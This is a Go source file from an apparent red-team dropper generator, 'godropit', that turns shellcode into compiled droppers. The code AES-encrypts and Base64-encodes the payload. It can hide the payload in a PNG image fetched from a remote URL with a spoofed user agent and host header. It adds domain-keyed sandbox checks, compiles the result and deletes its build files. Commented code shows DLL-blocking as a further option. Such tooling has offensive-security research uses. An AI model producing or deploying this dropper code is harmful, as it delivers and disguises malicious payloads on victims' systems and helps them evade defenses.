package gengo

import (
	"log"
	"os"
	"path/filepath"

	"github.com/kopp0ut/godropit/pkg/box"
	"github.com/kopp0ut/godropit/pkg/dropfmt"

	"github.com/fatih/color"
)

func NewShellcode(goDrop *Dropper, input, output, dropname string, sgn bool) (shellcode dropfmt.DropFmt) {

	// if input is CALC, use inbuilt CALC shellcode.
	if input == "CALC" {
		shellcode.Buf = CalcCode
	} else {
		shellcode = GetShellcode(input)
	}

	//SGN. Not currently implemented because I honeslty couldn't be bothered.
	/*if sgn {
		color.Yellow("Shikata Ga Nai encoding shellcode.")
		//shellcode.SGN(archInt)
	}
	*/

	//Format Shellcode for dropper.
	_, err := shellcode.AESEncrypt()
	if err != nil {
		log.Fatalf("Error Encrypting shellcode:\n%v\n", err)
	}
	//Prep shellcode.
	goDrop.BufStr = `"` + shellcode.ToB64() + `"`
	goDrop.KeyStr = `"` + shellcode.KeyB64() + `"`
	if goDrop.Debug {

		writeShellcodeFiles(goDrop.BufStr, goDrop.KeyStr, output, dropname, shellcode.Buf)

	}
	return shellcode
}

func NewStager(goDrop *Dropper, shellcode dropfmt.DropFmt, url, img, host, useragent, dropname, output string) {
	//Add stager code if url is set.

	stagedimage := filepath.Join(output, dropname+"_stager.png")
	createStagerImg(img, shellcode.ToB64(), stagedimage)

	if useragent == "" {
		goDrop.Ua = `ua := "` + defaultagent + `"`
	} else {
		goDrop.Ua = `ua := "` + useragent + `"`
	}

	goDrop.HostHdr = `hostname := "` + host + `"`
	goDrop.Url = `url := "` + url + `"`
	goDrop.Stager = stegStager
	goDrop.StagerImport = stagerImport
	goDrop.StegImport = stegImport
	goDrop.BufStr = "loadImage()"

}

func NewDropper(goDrop Dropper, dropname, domain, input, output string) {
	/*
		Old code to block non-ms dlls from loading into the process, tbh, not super handy and breaks the payloads unfortunately but can uncomment if you want it.

		if Leet {
			color.Cyan("Note: 1337 Droppers block nonms dlls from loading in the process.\nThis can sometimes break some payloads. Either modify or don't use 1337 mode.")
			goDrop.LeetImp = LeetImports
			goDrop.BlockNonMs = BlockNonMs
			goDrop.MemCom = ""
			dropname = strings.ReplaceAll(dropname, "hunter2", "")
		} else {
			goDrop.LeetImp = ""
			goDrop.BlockNonMs = ""
			goDrop.MemCom = MemCom

		}
	*/
	//Set Debug mode.
	Debug = goDrop.Debug

	goDrop.LeetImp = ""
	goDrop.BlockNonMs = ""
	goDrop.MemCom = MemCom

	if Debug {
		color.Yellow("[gengo] Debug enabled, gengo will save files related to compilation.")
		if goDrop.Arch {
			color.Yellow("[gengo] Arch set to x86, please note this is not supported for all droppers.")
		}
	}

	// Add domain checks.
	if domain != "" {
		goDrop.Domain = domain
		goDrop.BoxChkFunc = box.DomKeyFunc
		goDrop.BoxChkImp = box.BoxChkImp
		goDrop.ChkBox = box.CheckDom
	} else {
		goDrop.Domain = ""
	}

	outpath, err := filepath.Abs(output)
	if err != nil {
		log.Fatalf("Error getting absolute path for output: %v", err)
	}
	//write our dropper template.
	dropfilename := dropname + ".go"
	dropFilepath := filepath.Join(outpath, dropfilename)
	dropperFile, err := os.Create(dropFilepath)
	if err != nil {
		log.Fatalf("Error creating dropper file: %v ", err)
	}

	//Write the final template
	err = goDrop.writeFinalGoTemplate(dropperFile)
	if err != nil {
		log.Fatalf("Error writing dropper source:\n%v\n", err)
	}
	dropperFile.Close()
	color.Green("Dropper src written to: %s\n", dropFilepath)

	//generate the build files and
	err = buildInstruct(outpath, dropfilename, goDrop.Shared, goDrop.Arch)
	if err != nil {
		log.Fatal(err)

	}

	//compile the dropper with the regular go compiler.

	buildFileGo(outpath, dropfilename, goDrop.Shared, goDrop.Arch)

	if !Debug {

		err = os.Remove(dropfilename)
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("go.mod")
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("go.sum")
		if err != nil {
			log.Print(err)
		}
		err = os.Remove("goenv.txt")
		if err != nil {
			log.Print(err)
		}
	}

}
